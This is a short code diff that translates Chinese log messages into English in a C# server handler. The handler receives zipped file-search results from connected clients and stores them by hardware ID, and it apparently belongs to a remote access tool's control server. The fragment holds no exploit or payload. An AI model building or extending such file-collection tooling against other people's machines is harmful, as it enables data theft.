@@ -25,12 +25,12 @@ namespace Server.Handle_Packet
                     byte[] zipFile = unpack_msgpack.ForcePathObject("ZipFile").GetAsBytes();
                     File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip", zipFile);
                 });
-                new HandleLogs().Addmsg($"客户端 {client.Ip} 文件查找成功，文件保存在 @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/FileSearcher", Color.Purple);
+                new HandleLogs().Addmsg($"Client {client.Ip} File Search success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/FileSearcher", Color.Purple);
                 client.Disconnected();
             }
             catch (Exception ex)
             {
-                new HandleLogs().Addmsg($"文件搜索 {ex.Message}", Color.Red);
+                new HandleLogs().Addmsg($"File Search error {ex.Message}", Color.Red);
             }
         }
     }
